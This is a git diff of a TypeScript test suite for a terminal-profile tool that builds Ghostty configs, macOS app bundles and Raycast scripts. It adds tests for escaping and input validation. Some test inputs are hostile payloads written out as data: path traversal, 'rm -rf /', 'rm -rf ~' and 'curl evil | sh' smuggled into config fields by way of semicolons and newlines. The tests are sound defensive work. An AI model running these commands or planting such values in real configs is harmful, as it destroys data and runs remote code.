@@ -14,11 +14,14 @@ import { aliasName, buildAliasFiles, buildIndex, buildWrapper } from '../src/ini
 import { buildApp, installIcon } from '../src/init/app.js';
 import {
   appBundlePath,
+  assertSafeAppName,
   buildCommand,
   buildGhosttyConfig,
-  buildLauncherSource,
+  buildHomeConfigShim,
   buildShellCommand,
   bundleId,
+  ghosttyHomeConfigPath,
+  ghosttyHomeDir,
 } from '../src/init/ghostty.js';
 import { buildRaycastCommand, raycastIcon } from '../src/init/raycast.js';
 import { defaultBaseDir, discoverProfiles, runInit } from '../src/init/scaffold.js';
@@ -126,7 +129,7 @@ describe('scaffold (real fs in a tmp dir)', () => {
     fs.mkdirSync(scripts);
     fs.writeFileSync(path.join(scripts, 'clabox-gone.sh'), '# old');
     try {
-      const res = await runInit({ baseDir: base });
+      const res = await runInit({ baseDir: base, trust: true });
       expect(res.profiles).toEqual(['ax', 'is']);
       expect(fs.existsSync(path.join(scripts, 'index.sh'))).toBe(true);
       expect(fs.existsSync(path.join(scripts, 'clabox-ax.sh'))).toBe(true);
@@ -160,7 +163,7 @@ describe('scaffold (real fs in a tmp dir)', () => {
     );
     fs.writeFileSync(path.join(configs, 'plain.mjs'), 'export default {}');
     try {
-      const res = await runInit({ baseDir: base });
+      const res = await runInit({ baseDir: base, trust: true });
       expect(res.profiles).toEqual(['mgr', 'plain']);
       const cfg = path.join(base, 'ghostty', 'mgr.config');
       expect(fs.existsSync(cfg)).toBe(true);
@@ -168,7 +171,7 @@ describe('scaffold (real fs in a tmp dir)', () => {
       expect(txt).toContain('title = "T"');
       expect(txt).toContain('background = #000000');
       expect(txt).toContain('cd "/tmp/proj" && ');
-      expect(txt).toContain(`CLABOX_CONFIGS_DIR="${configs}" "/usr/bin/clabox" -b mgr`);
+      expect(txt).toContain(`CLABOX_CONFIGS_DIR="${configs}" "/usr/bin/clabox" -b "mgr"`);
       // plain box has no app → no ghostty config
       expect(fs.existsSync(path.join(base, 'ghostty', 'plain.config'))).toBe(false);
       // a Raycast command that opens the (to-be) built app is written too
@@ -179,6 +182,15 @@ describe('scaffold (real fs in a tmp dir)', () => {
       expect(rayTxt).toContain('# @raycast.title T');
       expect(rayTxt).toContain("open '/tmp/apps/Test Mgr.app'");
       expect(fs.existsSync(path.join(base, 'raycast', 'plain.sh'))).toBe(false);
+      // the private XDG home the bundle gets via LSEnvironment — a pointer
+      // file, plus the conditional unset in the launched command.
+      const home = path.join(base, 'ghostty-home', 'mgr');
+      expect(res.ghosttyHomes).toEqual([home]);
+      expect(fs.readFileSync(path.join(home, 'ghostty', 'config'), 'utf8')).toContain(
+        `config-file = ${cfg}`,
+      );
+      expect(txt).toContain(`[ "$XDG_CONFIG_HOME" = "${home}" ] && unset XDG_CONFIG_HOME;`);
+      expect(fs.existsSync(path.join(base, 'ghostty-home', 'plain'))).toBe(false);
       // build skipped (Ghostty absent / not macOS) → warning, nothing built
       expect(res.apps).toEqual([]);
       expect(res.warnings.length).toBeGreaterThan(0);
@@ -200,10 +212,10 @@ describe('scaffold (real fs in a tmp dir)', () => {
       }`,
     );
     try {
-      await runInit({ baseDir: base });
+      await runInit({ baseDir: base, trust: true });
       const txt = fs.readFileSync(path.join(base, 'ghostty', 'mgr.config'), 'utf8');
       // bare `clabox`, not an absolute path — survives package-manager moves.
-      expect(txt).toContain(`CLABOX_CONFIGS_DIR="${configs}" "clabox" -b mgr`);
+      expect(txt).toContain(`CLABOX_CONFIGS_DIR="${configs}" "clabox" -b "mgr"`);
       expect(txt).not.toContain('.bun/bin/clabox');
     } finally {
       fs.rmSync(base, { recursive: true, force: true });
@@ -219,11 +231,13 @@ describe('scaffold (real fs in a tmp dir)', () => {
       `export default { app: { name: 'Test Mgr' }, appBuilder: { ghosttyApp: '/no/such/Ghostty.app' } }`,
     );
     try {
-      const res = await runInit({ baseDir: base, buildApps: false });
+      const res = await runInit({ baseDir: base, buildApps: false, trust: true });
       expect(res.ghosttyConfigs).toEqual([]);
+      expect(res.ghosttyHomes).toEqual([]);
       expect(res.raycastCommands).toEqual([]);
       expect(res.apps).toEqual([]);
       expect(fs.existsSync(path.join(base, 'ghostty'))).toBe(false);
+      expect(fs.existsSync(path.join(base, 'ghostty-home'))).toBe(false);
       expect(fs.existsSync(path.join(base, 'raycast'))).toBe(false);
     } finally {
       fs.rmSync(base, { recursive: true, force: true });
@@ -231,7 +245,7 @@ describe('scaffold (real fs in a tmp dir)', () => {
   });
 });
 
-describe('ghostty config + launcher generation', () => {
+describe('ghostty config generation', () => {
   const app: AppConfig = {
     name: 'AX Manager',
     title: '🐈‍⬛ AX Manager',
@@ -249,7 +263,7 @@ describe('ghostty config + launcher generation', () => {
   test('buildCommand cds into the project and runs clabox -b <box>', () => {
     expect(buildCommand(opts)).toBe(
       `command = zsh -lic 'cd "/Users/me/projects/ax-mg" && ` +
-        `CLABOX_CONFIGS_DIR="/Users/me/.config/clabox/configs" "/Users/me/.bun/bin/clabox" -b ax-mg; exec zsh'`,
+        `CLABOX_CONFIGS_DIR="/Users/me/.config/clabox/configs" "/Users/me/.bun/bin/clabox" -b "ax-mg"; exec zsh'`,
     );
   });
 
@@ -261,14 +275,14 @@ describe('ghostty config + launcher generation', () => {
       claboxBin: 'clabox',
     });
     expect(cmd).toBe(
-      `command = zsh -lic 'cd "/Users/me/Library/Mobile Documents/proj" && "clabox" -b ax-mg; exec zsh'`,
+      `command = zsh -lic 'cd "/Users/me/Library/Mobile Documents/proj" && "clabox" -b "ax-mg"; exec zsh'`,
     );
   });
 
   test('buildCommand without a projectDir omits the cd', () => {
     const cmd = buildCommand({ ...opts, projectDir: null });
     expect(cmd).not.toContain('cd ');
-    expect(cmd).toContain('-b ax-mg');
+    expect(cmd).toContain('-b "ax-mg"');
   });
 
   test('buildCommand omits CLABOX_CONFIGS_DIR when configsDir is null', () => {
@@ -276,20 +290,20 @@ describe('ghostty config + launcher generation', () => {
     expect(cmd).not.toContain('CLABOX_CONFIGS_DIR');
     expect(cmd).toBe(
       `command = zsh -lic 'cd "/Users/me/projects/ax-mg" && ` +
-        `"/Users/me/.bun/bin/clabox" -b ax-mg; exec zsh'`,
+        `"/Users/me/.bun/bin/clabox" -b "ax-mg"; exec zsh'`,
     );
   });
 
   test('buildCommand uses a bare `clabox` (PATH-resolved) when given one', () => {
     const cmd = buildCommand({ ...opts, configsDir: null, claboxBin: 'clabox' });
     expect(cmd).toBe(
-      `command = zsh -lic 'cd "/Users/me/projects/ax-mg" && "clabox" -b ax-mg; exec zsh'`,
+      `command = zsh -lic 'cd "/Users/me/projects/ax-mg" && "clabox" -b "ax-mg"; exec zsh'`,
     );
   });
 
   test('buildShellCommand appends extra args and survives a quote in them', () => {
     const cmd = buildShellCommand({ ...opts, configsDir: null, extraArgs: ['--rc', "it's"] });
-    expect(cmd).toContain('-b ax-mg "--rc"');
+    expect(cmd).toContain('-b "ax-mg" "--rc"');
     // A bare `'` would close the outer single-quoted string early.
     expect(cmd).toContain(`'\\''`);
     expect(cmd.startsWith("zsh -lic '")).toBe(true);
@@ -326,7 +340,7 @@ describe('ghostty config + launcher generation', () => {
     expect(txt).toContain('macos-icon = retro');
     expect(txt).toContain('background = #0d1117');
     expect(txt).toContain('background-opacity = 0.92');
-    expect(txt).toContain('-b ax-mg');
+    expect(txt).toContain('-b "ax-mg"');
     expect(txt).not.toContain('config-file =');
   });
 
@@ -335,17 +349,29 @@ describe('ghostty config + launcher generation', () => {
     expect(txt).toContain('config-file = /Users/me/bash/ghostty/config');
   });
 
-  test('buildLauncherSource bakes the config path and execs ghostty.real', () => {
-    const src = buildLauncherSource('/Users/me/x/ax-mg.config');
-    expect(src).toContain('static const char *CONFIG_PATH = "/Users/me/x/ax-mg.config";');
-    expect(src).toContain('ghostty.real');
-    expect(src).toContain('--config-file=%s');
-    expect(src).toContain('execv(real_path, new_argv);');
+  test('the per-box XDG home points back at the box config', () => {
+    const home = ghosttyHomeDir('/Users/me/.config/clabox', 'ax-mg');
+    expect(home).toBe('/Users/me/.config/clabox/ghostty-home/ax-mg');
+    // Ghostty reads exactly this path out of $XDG_CONFIG_HOME.
+    expect(ghosttyHomeConfigPath(home)).toBe(
+      '/Users/me/.config/clabox/ghostty-home/ax-mg/ghostty/config',
+    );
+    expect(buildHomeConfigShim('/Users/me/.config/clabox/ghostty/ax-mg.config')).toContain(
+      'config-file = /Users/me/.config/clabox/ghostty/ax-mg.config',
+    );
   });
 
-  test('buildLauncherSource C-escapes quotes and backslashes in the path', () => {
-    const src = buildLauncherSource('/a/"weird"\\path.config');
-    expect(src).toContain('"/a/\\"weird\\"\\\\path.config"');
+  test('the box command drops XDG_CONFIG_HOME, but only while it is still ours', () => {
+    const cmd = buildShellCommand({ ...opts, resetXdgConfigHome: '/home/ghostty-home/ax-mg' });
+    // Unconditional `unset` would also eat a user's own XDG_CONFIG_HOME, which
+    // `zsh -lic` has already re-exported from the login profile by this point.
+    expect(cmd).toContain(
+      `[ "$XDG_CONFIG_HOME" = "/home/ghostty-home/ax-mg" ] && unset XDG_CONFIG_HOME; cd `,
+    );
+  });
+
+  test('no reset is emitted when the command is not launched from an app bundle', () => {
+    expect(buildShellCommand(opts)).not.toContain('XDG_CONFIG_HOME');
   });
 
   test('appBundlePath / bundleId derive sane defaults and honor overrides', () => {
@@ -354,6 +380,92 @@ describe('ghostty config + launcher generation', () => {
     );
     expect(bundleId('ax-mg', app)).toBe('com.ghostty.custom.ax.mg');
     expect(bundleId('ax-mg', { ...app, bundleId: 'com.me.ax' })).toBe('com.me.ax');
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Unit: input validation in the generators
+//
+// `init` turns config strings into a path it `rm -rf`s, a shell command and a
+// line-oriented config file. Box configs can come from a repo, so these inputs
+// are not automatically the user's own.
+// ---------------------------------------------------------------------------
+
+describe('generator input validation', () => {
+  const app: AppConfig = { name: 'AX Manager', title: 'T' };
+
+  test('app.name may not traverse out of appsDir', () => {
+    // Unvalidated this resolves to /tmp/x.app, which the builder rm -rf's and
+    // then clones Ghostty onto.
+    for (const name of ['../../../tmp/x', 'a/b', '.hidden', '..', '']) {
+      expect(() => appBundlePath('/Users/me/Applications', { ...app, name })).toThrow(
+        /unsafe app\.name|escapes appsDir/,
+      );
+    }
+  });
+
+  test('app.name keeps allowing the things real app names contain', () => {
+    for (const name of ['AX Manager', '🐈‍⬛ AX', 'ax-mg_2.0']) {
+      expect(appBundlePath('/apps', { ...app, name })).toBe(`/apps/${name}.app`);
+    }
+  });
+
+  test('assertSafeAppName is what refuses, with the field named', () => {
+    expect(() => assertSafeAppName('a/b')).toThrow(/unsafe app\.name/);
+    expect(assertSafeAppName('Fine Name')).toBe('Fine Name');
+  });
+
+  test('a bundle id outside the reverse-DNS charset is refused', () => {
+    expect(() => bundleId('ax', { ...app, bundleId: 'com.me; rm -rf /' })).toThrow(
+      /unsafe bundle id/,
+    );
+    expect(() => bundleId('ax', { ...app, bundleId: 'com.me.ok-1' })).not.toThrow();
+  });
+
+  test('a newline in a Ghostty config value is refused, not escaped', () => {
+    // The payload: a second `command = …` line. Scalar keys are last-wins in
+    // Ghostty, so it would run at every launch of the app — outside the sandbox.
+    const opts = {
+      app,
+      boxName: 'ax',
+      projectDir: '/proj',
+      configsDir: null,
+      claboxBin: 'clabox',
+    };
+    expect(() =>
+      buildGhosttyConfig({
+        ...opts,
+        app: { ...app, title: 'T\ncommand = sh -c "curl evil|sh"' },
+      }),
+    ).toThrow(/app\.title must not contain newlines/);
+    expect(() =>
+      buildGhosttyConfig({ ...opts, app: { ...app, ghostty: { background: '#000\nfoo = bar' } } }),
+    ).toThrow(/app\.ghostty\['background'\]/);
+    expect(() => buildGhosttyConfig({ ...opts, projectDir: '/proj\nx' })).toThrow(
+      /projectDir must not contain newlines/,
+    );
+  });
+
+  test('the shell command refuses a newline in any interpolated value', () => {
+    expect(() =>
+      buildShellCommand({
+        boxName: 'ax',
+        projectDir: '/proj\nrm -rf ~',
+        configsDir: null,
+        claboxBin: 'clabox',
+      }),
+    ).toThrow(/must not contain newlines/);
+  });
+
+  test('a Raycast comment line stays one line', () => {
+    const txt = buildRaycastCommand({
+      app: { ...app, title: 'T\ncurl evil | sh' },
+      appPath: '/apps/T.app',
+    });
+    // A comment is only a comment up to the first newline, so the injected
+    // command must not survive as its own line.
+    expect(txt).not.toMatch(/^curl evil \| sh$/m);
+    expect(txt).toContain('# @raycast.title T curl evil | sh');
   });
 });
 
@@ -426,7 +538,7 @@ describe('buildApp (non-destructive on failure)', () => {
         buildApp({
           boxName: 'mgr',
           app: { name: 'Test Mgr' },
-          configPath: path.join(base, 'mgr.config'),
+          xdgConfigHome: path.join(base, 'ghostty-home', 'mgr'),
           builder: {
             ghosttyApp: donor,
             appsDir,
